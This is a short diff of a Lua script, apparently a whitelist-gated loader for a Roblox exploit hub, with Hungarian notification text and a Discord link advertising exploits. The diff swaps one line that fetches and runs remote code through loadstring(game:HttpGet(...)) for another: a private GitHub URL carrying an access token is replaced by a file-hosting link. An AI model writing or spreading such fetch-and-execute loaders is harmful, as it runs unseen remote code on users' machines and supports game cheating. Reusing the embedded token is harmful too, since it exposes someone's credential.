@@ -11,7 +11,7 @@ if table.find(whitelist, playername) then
             Description = "Sikeresen átmentél a whitelist teszten!\ndiscord.io/convetaexploit",
             Duration = 3
         })
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/voidstardev/private-premium-xenurion/main/XenurionHub-Premium-Protected.lua?token=GHSAT0AAAAAAB6W3D6KVLH3DIH3RXRWRQYEY76LSDQ"))()
+        loadstring(game:HttpGet("https://files.fm/f/d23p5ff9u"))()
 else
         WhitelistNotify({
             Title = "Whitelist Rendszer",
